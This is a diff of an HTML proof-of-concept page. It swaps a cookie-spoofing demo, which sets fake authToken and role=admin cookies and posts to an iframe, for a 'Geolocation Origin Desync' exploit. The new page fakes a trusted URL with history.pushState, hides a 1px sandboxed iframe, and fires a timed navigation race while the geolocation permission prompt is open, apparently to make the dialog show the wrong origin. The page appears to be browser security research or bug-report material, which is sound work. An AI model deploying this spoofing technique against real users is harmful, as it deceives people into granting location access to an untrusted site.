@@ -1,26 +1,104 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Parent Page - Cookie Spoofing</title>
+  <meta charset="utf-8">
+  <title>Geolocation Origin Desync PoC - OriginA</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, system-ui;
+      background: #f5f5f7;
+    }
+
+    button {
+      font-size: 15px;
+      padding: 10px 14px;
+      border-radius: 10px;
+      border: none;
+      background: #007aff;
+      color: #fff;
+    }
+
+    #panel {
+      display: none;
+      max-width: 420px;
+      margin: 80px auto;
+      background: #fff;
+      padding: 24px;
+      border-radius: 16px;
+      box-shadow: 0 20px 60px rgba(0,0,0,.2);
+      text-align: center;
+    }
+
+    .notice {
+      margin-top: 14px;
+      font-size: 13px;
+      color: #b00020;
+    }
+  </style>
 </head>
+
 <body>
-  <h1>Parent Page (Origin A)</h1>
-  <iframe id="myiframe" src="https://cnfdnfial-ops.github.io/spoof/originB.html" style="width:400px; height:400px;"></iframe>
 
-  <script>
-    const iframe = document.getElementById("myiframe");
+<div style="text-align:center; margin-top:60px;">
+  <button id="trigger">Start PoC</button>
+</div>
 
-    iframe.addEventListener("load", () => {
-      // Menyiapkan data palsu untuk cookies
-      document.cookie = "userId=12345; path=/";
-      document.cookie = "authToken=abcdefg12345; path=/";
-      document.cookie = "role=admin; path=/";  // Data palsu yang bisa digunakan di iframe
+<div id="panel">
+  <h2>Request Location</h2>
+  <p>Tap the button below to request Geolocation permission.</p>
 
-      // Kirimkan informasi ini melalui postMessage
-      iframe.contentWindow.postMessage({ message: "Data cookies telah disuntikkan" }, 'https://cnfdnfial-ops.github.io/spoof/originB.html');
+  <button onclick="getLocation()">Get Location</button>
+  <p id="output">Location: -</p>
+
+  <div class="notice">
+    Demo only — observe origin shown in permission dialog
+  </div>
+</div>
+
+<iframe id="myiframe" src="originB.html" sandbox="allow-scripts" style="width:1px;height:1px;border:0"></iframe>
+
+<script>
+const panel   = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const output  = document.getElementById('output');
+
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      output.textContent =
+        `${pos.coords.latitude}, ${pos.coords.longitude}`;
+    },
+    () => {
+      output.textContent = 'Permission denied';
+    }
+  );
+}
+
+/*
+ * Step 1: Manipulate visible URL to a trusted-looking path
+ */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
+
+/*
+ * Step 2: Trigger a navigation race shortly after permission flow starts
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
     });
-  </script>
+  });
+});
+</script>
+
 </body>
 </html>
